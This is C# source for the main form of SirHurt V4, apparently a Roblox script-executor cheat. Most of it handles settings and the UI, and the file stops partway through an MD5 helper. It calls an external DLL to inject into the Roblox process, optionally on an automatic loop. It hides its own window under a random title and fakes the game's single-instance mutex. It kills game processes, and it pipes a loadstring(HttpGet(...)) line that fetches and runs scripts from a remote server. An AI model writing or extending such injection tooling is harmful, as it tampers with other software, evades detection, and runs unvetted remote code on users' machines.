using Bunifu.ToggleSwitch;
using Bunifu.UI.WinForms;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using Sirhurt_V4.ExtraData;
using Sirhurt_V4.Properties;
using SirhurtNewUI.MenuStripStuff;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data;
using System.Text.RegularExpressions;
using static Sirhurt_V4.ExtraData.ExtraFunc;
using static Sirhurt_V4.ExtraData.RedistributableChecker;
using System.Drawing.Drawing2D;
using ScintillaNET_FindReplaceDialog;

namespace Sirhurt_V4
{
    public partial class Main : Form
    {
        public string UIVersion = "1.0.8b";



        public string[] Files = { "SirHurtInjector.dll", "DCJ.dll" };
        public string[] CustomColorCodes = { "mainTextColor", "buttonbackcolor", "ribboncolor", "ribbonheight", "tabbackcolor", "textcolor", "topclickedcolor", "tophovercolor", "toppanelcolor", "textEditorColor", "textColor", "identifier", "blockComment", "commentLine", "commentDoc", "integer", "string", "character", "literalString", "operator", "keyword1 Color(\"warn print decompile\")", "keyword2 Color(\"if then else\")", "keyword3 Color(\"getgenv setclipboard getupvalue\")", "Custom Keyword Color"};
        public Dictionary<string, string> DefaultCodes = new Dictionary<string, string>{ ["mainTextColor"] = "158, 158, 158", ["buttonbackcolor"] = "30,30,30", ["ribboncolor"] = "10,132,255", ["ribbonheight"] = "3", ["tabbackcolor"] = "30,30,30", ["textcolor"] = "158,158,158", ["topclickedcolor"] = "50,50,52", ["tophovercolor"] = "0,0,140", ["toppanelcolor"] = "45,45,45", ["textEditorColor"] = "30,30,30", ["textColor"] = "255,255,255", ["identifier"] = "255,255,255", ["blockComment"] = "74,139,69", ["commentLine"] = "74,139,69", ["commentDoc"] = "58,64,34", ["integer"] = "181,206,168", ["string"] = "193,118,76", ["character"] = "193,118,76", ["literalString"] = "193,118,76", ["operator"] = "255,255,255", ["keyword1 Color(\"warn print decompile\")"] = "66,156,195", ["keyword2 Color(\"if then else\")"] = "69,180,152", ["keyword3 Color(\"getgenv setclipboard getupvalue\")"] = "103,216,218", ["Custom Keyword Color"] = "103,216,218" };
        private bool MDown2 = false;
        public List<JToken> LoadedScripts;
        private int NewWidth = 130;
        private int NewHeight = 3;

        private bool attached;
        private bool AttachedBackup;
        private uint attachedID;
        private bool fpsunlockerdata = false;
        private bool topmostdata = false;
        private bool autoinjectdata = false;
        private bool multiappdata = false;
        private bool NotifiedAlready = false;

        public static string IniDir = $"{Environment.CurrentDirectory}\\bin\\schemes\\settings.ini";
        public static string DirectoryIni = $"{Environment.CurrentDirectory}\\bin\\schemes";
        public static string ThemesDir = $"{Environment.CurrentDirectory}\\Themes";
        public static string CurrentDirectory = $"{Environment.CurrentDirectory}";
        IniFile MyIni = new IniFile(IniDir);
        private bool Resizing = false;
        ExtraFunc Funcs = new ExtraFunc();
        public ImageList ImageList = new ImageList();


        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        [DllImport("kernel32.dll")]
        static extern bool AttachConsole(int dwProcessId);
        [DllImport("SirHurtInjector.dll")]
        private static extern int InjectAllProcesses();

        [DllImport("SirHurtInjector.dll")]
        private static extern int Inject();
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern IntPtr FindWindowA(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("uxtheme.dll", ExactSpelling = true, CharSet = CharSet.Unicode)]
        private static extern int SetWindowTheme(IntPtr hwnd, string pszSubAppName, string pszSubIdList);
        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int FreeConsole();


        public void Debug(params object[] Data)
        {
            try
            {
                if (!Directory.Exists($"{CurrentDirectory}\\bin"))
                    Directory.CreateDirectory($"{CurrentDirectory}\\bin");
                string ToWrite = string.Join(" ", Data);
                Console.WriteLine("[" + DateTime.Now.ToString("h:mm:ss") + "] " + ToWrite);
                File.AppendAllText($"{CurrentDirectory}\\bin\\DebugData.txt", "[" + DateTime.Now.ToString("h:mm:ss") + "] " + ToWrite + "\n");
            }
            catch 
            {
                if (!NotifiedAlready)
                {
                    MessageBox.Show("Something is holding the debug file, you may not be able to get support if the UI crashes.", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    NotifiedAlready = true;
                }
            }
        }

        private void IniBullShit()
        {
            Size = Properties.Settings.Default.SavedSize;
            Location = Properties.Settings.Default.SavedLocation;
            label28.Text = UIVersion;
            Debug($"Setting saved location|Size: {Size} | {Location} {UIVersion}");
            if (!Directory.Exists(DirectoryIni))
            {
                Directory.CreateDirectory(DirectoryIni);
            }
            if (!File.Exists(IniDir))
            {
                try
                {
                    File.Create(IniDir).Dispose();
                }
                catch { }

                Debug($"Creating default save data");
                MyIni.Write("mainTextColor", "158, 158, 158", "main");
                MyIni.Write("language", "English", "main");
                MyIni.Write("newtreeviewstyle", "true", "main");
                MyIni.Write("useoldscriptloader", "false", "main");

                MyIni.Write("buttonbackcolor", "30,30,30", "TabControl");
                MyIni.Write("ribboncolor", "10,132,255", "TabControl");
                MyIni.Write("ribbonheight", "3", "TabControl");
                MyIni.Write("tabbackcolor", "30,30,30", "TabControl");
                MyIni.Write("textcolor", "158,158,158", "TabControl");
                MyIni.Write("topclickedcolor", "50,50,52", "TabControl");
                MyIni.Write("tophovercolor", "0,0,140", "TabControl");
                MyIni.Write("toppanelcolor", "45,45,45", "TabControl");

                MyIni.Write("fpsUnlocker", "false", "extra");
                MyIni.Write("topMost", "false", "extra");
                MyIni.Write("multiApplication", "false", "extra");
                MyIni.Write("autoInject", "false", "extra");
                MyIni.Write("debugdata", "false", "extra");

                MyIni.Write("textEditorColor", "30,30,30", "scintilla");
                MyIni.Write("textColor", "255,255,255", "scintilla");
                MyIni.Write("identifier", "255,255,255", "scintilla");
                MyIni.Write("blockComment", "74,139,69", "scintilla");
                MyIni.Write("commentLine", "74,139,69", "scintilla");
                MyIni.Write("commentDoc", "58,64,34", "scintilla");
                MyIni.Write("integer", "181,206,168", "scintilla");
                MyIni.Write("string", "193,118,76", "scintilla");
                MyIni.Write("character", "193,118,76", "scintilla");
                MyIni.Write("literalString", "193,118,76", "scintilla");
                MyIni.Write("operator", "255,255,255", "scintilla");
                MyIni.Write("keyword1 Color(\"warn print decompile\")", "66,156,195", "scintilla");
                MyIni.Write("keyword2 Color(\"if then else\")", "69,180,152", "scintilla");
                MyIni.Write("keyword3 Color(\"getgenv setclipboard getupvalue\")", "103,216,218", "scintilla");
                MyIni.Write("Custom Keywords", "seperate_them_with_a_space", "scintilla");
                MyIni.Write("Custom Keyword Color", "103,216,218", "scintilla");
            }
            else
            {
                if (File.ReadAllLines(IniDir).Count() != 37)
                {
                    DialogResult dialog = MessageBox.Show("Settings file has an update would you like to backup your settings file?", "Sirhurt V4", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
                    Debug($"Settings file missmatch: {File.ReadAllLines(IniDir).Count()}");
                    if (dialog == DialogResult.Yes)
                    {
                        if (File.Exists($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini"))
                        {
                            if (File.Exists($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini.bak"))
                            {
                                File.Delete($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini.bak");
                            }
                            File.Move($"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini", $"{Environment.CurrentDirectory}\\bin\\schemes\\Settings.ini.bak");
                        }
                    }


                    MyIni.Write("mainTextColor", "158, 158, 158", "main");
                    MyIni.Write("language", "English", "main");
                    MyIni.Write("newtreeviewstyle", "true", "main");
                    MyIni.Write("useoldscriptloader", "false", "main");

                    MyIni.Write("buttonbackcolor", "30,30,30", "TabControl");
                    MyIni.Write("ribboncolor", "10,132,255", "TabControl");
                    MyIni.Write("ribbonheight", "3", "TabControl");
                    MyIni.Write("tabbackcolor", "30,30,30", "TabControl");
                    MyIni.Write("textcolor", "158,158,158", "TabControl");
                    MyIni.Write("topclickedcolor", "50,50,52", "TabControl");
                    MyIni.Write("tophovercolor", "0,0,140", "TabControl");
                    MyIni.Write("toppanelcolor", "45,45,45", "TabControl");

                    MyIni.Write("fpsUnlocker", "false", "extra");
                    MyIni.Write("topMost", "false", "extra");
                    MyIni.Write("multiApplication", "false", "extra");
                    MyIni.Write("autoInject", "false", "extra");
                    MyIni.Write("debugdata", "false", "extra");

                    MyIni.Write("textEditorColor", "30,30,30", "scintilla");
                    MyIni.Write("textColor", "255,255,255", "scintilla");
                    MyIni.Write("identifier", "255,255,255", "scintilla");
                    MyIni.Write("blockComment", "74,139,69", "scintilla");
                    MyIni.Write("commentLine", "74,139,69", "scintilla");
                    MyIni.Write("commentDoc", "58,64,34", "scintilla");
                    MyIni.Write("integer", "181,206,168", "scintilla");
                    MyIni.Write("string", "193,118,76", "scintilla");
                    MyIni.Write("character", "193,118,76", "scintilla");
                    MyIni.Write("literalString", "193,118,76", "scintilla");
                    MyIni.Write("operator", "255,255,255", "scintilla");
                    MyIni.Write("keyword1 Color(\"warn print decompile\")", "66,156,195", "scintilla");
                    MyIni.Write("keyword2 Color(\"if then else\")", "69,180,152", "scintilla");
                    MyIni.Write("keyword3 Color(\"getgenv setclipboard getupvalue\")", "103,216,218", "scintilla");
                    MyIni.Write("Custom Keywords", "seperate_them_with_a_space", "scintilla");
                    MyIni.Write("Custom Keyword Color", "103,216,218", "scintilla");
                }
            }

            TopMost = Funcs.ToBool(MyIni.Read("topMost", "extra"));
            topmostdata = TopMost;
            topmostchecked.Value = TopMost;

            topmostchecked.Value = Funcs.ToBool(MyIni.Read("topMost", "extra"));
            multiappchecked.Value = Funcs.ToBool(MyIni.Read("multiApplication", "extra"));
            fpsunlockchecked.Value = Funcs.ToBool(MyIni.Read("fpsUnlocker", "extra"));
            autoattachchecked.Value = Funcs.ToBool(MyIni.Read("autoInject", "extra"));
            Debug("Detected Values:", Funcs.ToBool(MyIni.Read("topMost", "extra")), Funcs.ToBool(MyIni.Read("multiApplication", "extra")), Funcs.ToBool(MyIni.Read("fpsUnlocker", "extra")), Funcs.ToBool(MyIni.Read("autoInject", "extra")));

            Debug("1");
            if (multiappchecked.Value)
            {
                multiappdata = true;
                multiappchecked.Value = true;
                try
                {
                    foreach (Process Proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                        Proc.Kill();
                    new Mutex(true, "ROBLOX_singletonMutex");
                }
                catch
                {
                    MessageBox.Show("An error occured while enabling MultiApp, it has not been activated.");
                    new Mutex(false, "ROBLOX_singletonMutex");
                    multiappdata = false;
                    multiappchecked.Value = false;
                }
            }
            else
            {
                multiappdata = false;
                multiappchecked.Value = false;
                new Mutex(false, "ROBLOX_singletonMutex");
            }

            Debug("2");
            if (fpsunlockchecked.Value)
            {
                fpsunlockerdata = true;
                fpsunlockchecked.Value = true;
                bool Checkd = fpsunlockchecked.Value;

                var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);

                if (Checkd == true)
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "1", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
                else
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "0", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
            }
            else
            {
                fpsunlockerdata = false;
                fpsunlockchecked.Value = false;
                bool Checkd = fpsunlockchecked.Value;
                var wtKey = Registry.CurrentUser.OpenSubKey("Software\\Asshurt", true);

                if (Checkd == true)
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "1", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
                else
                {
                    if (wtKey != null)
                    {
                        wtKey.SetValue("EnableFPSUnlocker", "0", RegistryValueKind.String);
                        wtKey.Close();
                    }
                }
            }

            Debug("3");
            if (autoattachchecked.Value)
            {
                autoinjectdata = true;
                Attach.SizeMode = PictureBoxSizeMode.Zoom;
                Attach.Image = Resources.Infinity_11;
                AutoAttachFunc();
            }
            Color NewColor;
            Debug("4");
            foreach (string Item in CustomColorCodes)
            {
                int Index = Array.FindIndex(CustomColorCodes, row => row.Contains(Item));
                if (Index == 0)
                {
                    try
                    {
                        NewColor = Funcs.ToColor(MyIni.Read("mainTextColor", "main"));
                    }
                    catch
                    {
                        MessageBox.Show($"Hey! It looks like {Item} RGB Code was messed up, we are setting it to its default value!", "Sirhurt Error Catcher", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        MyIni.Write(Item, DefaultCodes[Item], "main");
                        Process.Start(Application.ExecutablePath);
                        Process.GetCurrentProcess().Kill();
                    }
                }
                else if (Index >= 1 && Index <= 8)
                {
                    try
                    {
                        if (Index == 3)
                        {
                            int.Parse(MyIni.Read("ribbonheight", "TabControl"));
                        }
                        else
                        {
                            NewColor = Funcs.ToColor(MyIni.Read("mainTextColor", "TabControl"));
                        }
                    }
                    catch
                    {
                        MessageBox.Show($"Hey! It looks like {Item} RGB Code was messed up, we are setting it to its default value!", "Sirhurt Error Catcher", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        MyIni.Write(Item, DefaultCodes[Item], "TabControl");
                        Process.Start(Application.ExecutablePath);
                        Process.GetCurrentProcess().Kill();
                    }
                }
                else if (Index >= 9 && Index <= 23)
                {
                    try
                    {
                        NewColor = Funcs.ToColor(MyIni.Read("mainTextColor", "scintilla"));
                    }
                    catch
                    {
                        MessageBox.Show($"Hey! It looks like {Item} RGB Code was messed up, we are setting it to its default value!", "Sirhurt Error Catcher", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        MyIni.Write(Item, DefaultCodes[Item], "scintilla");
                        Process.Start(Application.ExecutablePath);
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }
            Debug("5");
            irisTabControl1.ButtonBackColor =  Funcs.ToColor(MyIni.Read("buttonbackcolor", "TabControl"));
            irisTabControl1.RibbonColor = Funcs.ToColor(MyIni.Read("ribboncolor", "TabControl"));
            try
            {
                NewHeight = int.Parse(MyIni.Read("ribbonheight", "TabControl"));
            }
            catch {
                NewHeight = 3;
            }
            irisTabControl1.RibbonHeight = 3;
            irisTabControl1.TabBackColor = Funcs.ToColor(MyIni.Read("tabbackcolor", "TabControl"));
            irisTabControl1.TextColor = Funcs.ToColor(MyIni.Read("textcolor", "TabControl"));
            irisTabControl1.TopClickColor = Funcs.ToColor(MyIni.Read("topclickedcolor", "TabControl"));
            irisTabControl1.TopPannelColor = Funcs.ToColor(MyIni.Read("toppanelcolor", "TabControl"));
            irisTabControl1.Refresh();
            Debug("Ini file complete!");
        }

        private void SetupThemes()
        {
            if (!Directory.Exists(ThemesDir))
                Directory.CreateDirectory(ThemesDir);

            foreach (string Item in Files)
            {
                if (!File.Exists($"{ThemesDir}\\{Item}"))
                {
                    try
                    {
                        File.Copy($"{CurrentDirectory}\\{Item}", $"{ThemesDir}\\{Item}");
                    }
                    catch { }
                }
            }
            try{
                if (File.Exists($"{ThemesDir}\\SirHurt.dll"))
                    File.Delete($"{ThemesDir}\\SirHurt.dll");
                File.Copy($"{CurrentDirectory}\\SirHurt.dll", $"{ThemesDir}\\SirHurt.dll");
            }catch{

            }

            foreach(string File in Directory.GetFiles(ThemesDir))
            {
                if (File.Contains(".exe"))
                {
                    string[] SplitString = File.Split('\\');

                    themestoolstripmenuitem.DropDownItems.Add(SplitString[SplitString.Count() - 1] );
                }
            }

            foreach(ToolStripDropDownItem item in themestoolstripmenuitem.DropDownItems)
            {
                item.ForeColor = Color.FromArgb(250, 250, 250);
                item.Click += Item_Click;
            }


        }

        private void Item_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Save();
            Process.Start($"{ThemesDir}\\{(sender as ToolStripDropDownItem).Text}");
            Process.GetCurrentProcess().Kill();
        }

        private void CheckDir()
        {
            string TempFix = Path.GetTempPath().Substring(0, Path.GetTempPath().Length - 1);

            Debug("Directory Check:",TempFix, CurrentDirectory);
            if (CurrentDirectory.Contains(TempFix))
            {
                MessageBox.Show("Sirhurt cannot be ran from ZIP/TEMP, please run from desktop or another location!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Process.GetCurrentProcess().Kill();
            }
            if (Directory.Exists($"{CurrentDirectory}\\scripts"))
            {
                Debug("Bad script directory renaming...");
                try
                {
                    Directory.Move($"{CurrentDirectory}\\scripts", $"{CurrentDirectory}\\SCRIPTSBAK");
                    Directory.Move($"{CurrentDirectory}\\SCRIPTSBAK", $"{CurrentDirectory}\\Scripts");
                }
                catch
                {
                    MessageBox.Show("There was an error loading your scripts folder, please have the folder named \"Scripts\"!", "Sirhurt V4", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(Environment.ExitCode);
                }
            }
        }

        public Main()
        {
            InitializeComponent();
            MainStrip.Renderer = new BrowserMenuRenderer();
            TabControlContext.Renderer = new BrowserMenuRenderer();
            ScriptListContext.Renderer = new BrowserMenuRenderer(); 
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Funcs.ToBool(MyIni.Read("debugdata", "extra")))
            {
                AttachConsole(Process.GetCurrentProcess().Id);
                AllocConsole();
                Debug("Ini:true");
            } 
            Debug("============New Launch=================");
            Debug("Ini debug...", Funcs.ToBool(MyIni.Read("debugdata", "main")));
            Debug("Hiding sirhurt...");
            Text = RandomString(9);
            Name = Text;
            SirhurtTitle.Text = Name;

            Debug("Checking for directory anomalies...");
            CheckDir();

            Debug("Checking files");
            if (!Environment.CurrentDirectory.Contains(@"NewNewNew"))
                CheckFiles();

            Debug("Calling Setup functions... 1/9");
            BunifuBrokeFix();
            Debug("Calling Setup functions... 2/9");
            IniBullShit();
            Debug("Calling Setup functions... 3/9");
            InjectListener();
            Debug("Calling Setup functions... 4/9");
            ScriptLoading();
            Debug("Calling Setup functions... 5/9");
            ExtraEventHandlers();
            Debug("Calling Setup functions... 6/9");
            Handle_Discord();
            Debug("Calling Setup functions... 7/9");
            AutoAttachFunc();
            Debug("Calling Setup functions... 8/9");
            SetupThemes();
            Debug("Calling Setup functions... 9/9");
            LoadIcons();
            Debug("Done Calling Setup functions!");

            if (Funcs.ToBool(MyIni.Read("newtreeviewstyle", "main")))
            {
                if (Environment.Is64BitOperatingSystem)
                {
                    NativeMethods.SetWindowTheme(ScriptList.Handle, "explorer", null);
                }
            }
            
            Debug("Starting Main_Load()");
            Debug("Checking for Sirhurt Processes");
            foreach (Process process in Process.GetProcessesByName("Sirhurt V4"))
            {
                if (process.Id != Process.GetCurrentProcess().Id)
                    process.Kill();
            }
            Debug("Checking for Sirhurt Processes ran");
            irisTabControl1.CreateTab();


        }

        #region Inject Shit
        public void AutoAttachFunc()
        {

            var t2 = new Thread(delegate ()
            {
                for (; ; )
                {
                    Thread.Sleep(100);
                    if (autoinjectdata)
                    {
                        Thread.Sleep(2000);
                        InjectSirHurt();
                    }

                    var intPtr = FindWindowA("WINDOWSCLIENT", "Roblox");
                    var num = 0u;
                    GetWindowThreadProcessId(intPtr, out num);
                    if (intPtr == IntPtr.Zero && attached || attachedID != 0u && num != attachedID)
                    {
                        attached = false;
                        MainStrip.Invoke(new Action(() =>
                        {
                            Attach.SizeMode = PictureBoxSizeMode.Zoom; Attach.Image = Resources.bitmap;
                        }));
                    }
                }
            });
            t2.Start();
        }


        public void InjectSirHurt()
        {
            Debug("Attempting to attach");
            new Thread(delegate ()
            {
                try
                {
                    Debug("Attach Step1");
                    var AutoAttach = autoinjectdata;
                    var intPtr = FindWindowA("WINDOWSCLIENT", "Roblox");
                    Debug("Attach Step2");
                    if (!attached && intPtr != IntPtr.Zero)
                    {
                        Debug("Attach Step3");
                        var num = 0;
                        if (AutoAttach) Thread.Sleep(3000);
                        Debug("Attach Step4");
                        try
                        {

                            Debug("Attach Step5");
                            if (multiappdata)
                                num = InjectAllProcesses();
                            else
                                num = Inject();
                            Debug("Attach Step6");
                        }
                        catch (Exception ex)
                        {
                            Debug("Attach Step6.5");
                            attached = false;
                            MainStrip.Invoke(new Action(() => {
                                    Attach.SizeMode = PictureBoxSizeMode.Zoom; Attach.Image = Resources.bitmap;
                            }));
                            MessageBox.Show($"An error occured with injecting SirHurt: {ex.Message}", "SirHurt V4");
                        }

                        Debug("Attach Step7");
                        if (num != 0)
                        {
                            Debug("Attach Step8");
                            attached = true;
                            AttachedBackup = true;
                            return;
                        }

                        Debug("Attach Step9");
                        attached = false;
                        MainStrip.Invoke(new Action(() => {
                                Attach.SizeMode = PictureBoxSizeMode.Zoom; Attach.Image = Resources.bitmap;
                            
                        }));
                    }
                }
                catch
                {
                    Debug("Attaching failed.");
                }

            }).Start();
        }

        private void InjectListener()
        {
            new Thread(async() =>
            {
                var Server = new NamedPipeServerStream("SirHurtI", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0);
                Server.WaitForConnection();

                StreamReader streamReader = new StreamReader(Server);

                for (; ; )
                {
                    
                    string Data = "";
                    try
                    {
                        Data = streamReader.ReadLine();
                    }
                    catch
                    {
                        Data = "SIR_NOT_READY";
                    }

                    if (Data == "SH_DONE")
                    {
                        Attach.Image = Resources.NewAttachGif;
                        
                        await Task.Delay(1300); // 1300
                        Attach.Image = Resources.NewAttachDone;
                        AttachedBackup = true;
                        Debug("SH_DONE");
                        Debug("injectedv2");
                    }

                    if (attached && AttachedBackup)
                    {
                        Debug("injected");
                        await Task.Delay(100);
                        Attach.Image = Resources.NewAttachDone;
                    }
                    else
                    {
                        await Task.Delay(100);
                        Attach.Image = Resources.bitmap;

                        Debug("Not injected", attached.ToString(), AttachedBackup.ToString());

                        Server.Close();
                        Server = new NamedPipeServerStream("SirHurtI", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0);
                        Server.WaitForConnection();

                        streamReader = new StreamReader(Server);
                    }
                    await Task.Delay(50);
                }
            }).Start();

            new Thread(async () =>
            {
                for (; ; )
                {
                    if (Process.GetProcessesByName("RobloxPlayerBeta").Length == 0)
                    {
                        Debug("RBX Process not found, removing gif...");
                        Attach.Image = Resources.bitmap;
                    }
                    await Task.Delay(500);
                }
            }).Start();
        }

        public class RoundButton : Button
        {
            protected override void OnPaint(System.Windows.Forms.PaintEventArgs e)
            {
                GraphicsPath grPath = new GraphicsPath();
                grPath.AddEllipse(0, 0, ClientSize.Width - 4, ClientSize.Height- 4);
                this.Region = new Region(grPath);
                base.OnPaint(e);
            }
        }

        #endregion
        #region MenuStrip_Shit
        private void close_MouseEnter(object sender, EventArgs e)
        {
            close.BackColor = Color.FromArgb(255, 82, 77);
        }

        private void close_MouseLeave(object sender, EventArgs e)
        {
            close.BackColor = Color.FromArgb(255, 96, 92);
        }

        private void minimize_Enter(object sender, EventArgs e)
        {
            minimize.BackColor = Color.FromArgb(235, 164, 31);
        }

        private void minimize_Leave(object sender, EventArgs e)
        {
            minimize.BackColor = Color.FromArgb(255, 189, 68);
        }


        private void killRobloxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Process Proc in Process.GetProcessesByName("RobloxPlayerBeta"))
                Proc.Kill();
        }
        private void joinDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/FgpnNNr");
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Save();
            DialogResult Diag = MessageBox.Show("Are you sure you will like to exit?", "Sirhurt", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (Diag == DialogResult.Yes)
            {
                try
                {
                    foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
                        process.Kill();
                    foreach (Process process in Process.GetProcessesByName("Sirhurt V4"))
                        process.Kill();
                }
                catch { }
            }
        }
        #endregion
        #region TopBarShit
        private void close_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Save();
            DialogResult Diag = MessageBox.Show("Are you sure you will like to exit?", "Sirhurt", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (Diag == DialogResult.Yes)
            {
                Process.GetCurrentProcess().Kill();
            }
        }

        private void minimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void PanelMouseUp(object sender, MouseEventArgs e)
        {
            Resizing = false;
        }
        private void PanelMouseDown(object sender, MouseEventArgs e)
        {
            Resizing = true;
        }
        private void PanelMouseMove(object sender, MouseEventArgs e)
        {
            if (Resizing)
            {
                int w = Size.Width;
                int h = Size.Height;

                if (Cursor.Current.ToString() == "[Cursor: SizeNS]")
                {
                    Size = new Size(w, h + (e.Location.Y));
                    Update();
                }
                else if (Cursor.Current.ToString() == "[Cursor: SizeWE]")
                {
                    Size = new Size(w + (e.Location.X), h);
                    Update();
                }
                else if (Cursor.Current.ToString() == "[Cursor: SizeNWSE]")
                {
                    Size = new Size(w + (e.Location.X), h + (e.Location.Y));
                    Update();
                }
                Update();
                Properties.Settings.Default.SavedSize = Size;
            }
        }
        #endregion
        #region LeftPanel
        private void LeftPanel_SizeChanged(object sender, EventArgs e)
        {
            (sender as BunifuPictureBox).Height = (sender as BunifuPictureBox).Width;
        }

        private void LeftPanel_MouseEnter(object sender, EventArgs e)
        {
            BunifuPictureBox CurrentPanel = (sender as BunifuPictureBox);
            CurrentPanel.BackColor = Color.FromArgb(60, 60, 60);
        }

        private void LeftPanel_MouseLeave(object sender, EventArgs e)
        {
            BunifuPictureBox CurrentPanel = (sender as BunifuPictureBox);
            CurrentPanel.BackColor = Color.FromArgb(50, 50, 50);
        }

        private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
        {
            BunifuPictureBox CurrentPanel = (sender as BunifuPictureBox);
            CurrentPanel.BackColor = Color.FromArgb(80, 80, 80);
        }

        private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
        {
            BunifuPictureBox CurrentPanel = (sender as BunifuPictureBox);
            CurrentPanel.BackColor = Color.FromArgb(60, 60, 60);
        }


        private void Attach_Click(object sender, EventArgs e)
        {
            if (!attached)
            {
                Attach.SizeMode = PictureBoxSizeMode.Zoom;
                Attach.Image = Resources.Infinity_11;
            }
            InjectSirHurt();
        }

        private void RunScript_Click(object sender, EventArgs e)
        {
            SirHurtPipe(irisTabControl1.GetWorkingEditor().Text);
            Debug(irisTabControl1.GetWorkingEditor().Text);
        }

        private void ReFreshScriptHub()
        {
            ScriptHubList.Items.Clear();
            var json = httpGet("https://sirhurt.net/upl/UIScriptHub/fetch.php");
            var list2 = JsonDecode(json)["scripts"].Children().Children().ToList();
            LoadedScripts = list2;
            foreach (var jtoken in list2) ScriptHubList.Items.Add(jtoken["Name"].ToString());
            ScriptHubList.SetSelected(0, true);
        }

        private void ScriptHub_Click(object sender, EventArgs e)
        {
           
            if (SettingsPanel.Visible)
            {
                bunifuTransition1.HideSync(SettingsPanel);
            }
            if (!ScriptHubPanel.Visible)
            {
                if (ScriptHubList.Items.Count <= 1)
                {
                    ReFreshScriptHub();
                }
                bunifuTransition1.ShowSync(ScriptHubPanel);
            }
            else
            {
                bunifuTransition1.HideSync(ScriptHubPanel);
            }
        }

        private void ScriptHubList_SelectedIndexChanged(object sender, EventArgs e)
        {
            var b = ScriptHubList.SelectedItem.ToString();
            foreach (var jtoken in LoadedScripts)
                if (jtoken["Name"].ToString() == b)
                {
                    richTextBox1.Text = jtoken["Desc"].ToString();
                    pictureBox1.LoadAsync(jtoken["Picture"].ToString());
                }
        }

        private void ExecuteScriptHub_Click(object sender, EventArgs e)
        {
            var text = ScriptHubList.SelectedItem.ToString();
            foreach (var jtoken in LoadedScripts)
                if (jtoken["Name"].ToString() == text)
                    text = jtoken["FileName"].ToString();
            SirHurtPipe("loadstring(HttpGet('https://sirhurt.net/upl/UIScriptHub/Scripts/script.php?script=" +
                        text + "'))()");
        }

        private void RefreshScriptHub_Click(object sender, EventArgs e)
        {
            ReFreshScriptHub();
        }

        private void Settings_Click(object sender, EventArgs e)
        {
            if (SettingsPanel.Visible)
            {
                bunifuTransition1.HideSync(SettingsPanel);
            }
            else
            {
                if (ScriptHubPanel.Visible)
                {
                    bunifuTransition1.HideSync(ScriptHubPanel);
                }
                BBackColor.Text = MyIni.Read("buttonbackcolor", "TabControl");
                RibbonColor.Text = MyIni.Read("ribboncolor", "TabControl");
                RibbonHeight.Text = MyIni.Read("ribbonheight", "TabControl");
                TabBackColor.Text = MyIni.Read("tabbackcolor", "TabControl");
                TabTextColor.Text = MyIni.Read("textcolor", "TabControl");
                TabClickedColor.Text = MyIni.Read("topclickedcolor", "TabControl");
                TopPanelColor.Text = MyIni.Read("toppanelcolor", "TabControl");

                EditorBackColor.Text = MyIni.Read("textEditorColor", "scintilla");
                EditorTextColor.Text = MyIni.Read("textColor", "scintilla");
                EditorCommentColor.Text = MyIni.Read("blockComment", "scintilla");
                EditorIntColor.Text = MyIni.Read("integer", "scintilla");
                EditorStringColor.Text = MyIni.Read("string", "scintilla");
                EditorOperatorColor.Text = MyIni.Read("operator", "scintilla");
                EditorKeyword1Color.Text = MyIni.Read("keyword1 Color(\"warn print decompile\")", "scintilla");
                EditorKeyword2Color.Text = MyIni.Read("keyword2 Color(\"if then else\")", "scintilla");
                EditorKeyword3Color.Text = MyIni.Read("keyword3 Color(\"getgenv setclipboard getupvalue\")", "scintilla");
                CustomKeywordColor.Text = MyIni.Read("Custom Keyword Color", "scintilla");

                bunifuTransition1.ShowSync(SettingsPanel);
            }
        }

        public string CalculateMD5Hash(string input)
        {
            // step 1, calculate MD5 hash from input
            MD5 md5 = System.Security.Cryptography.MD5.Create();
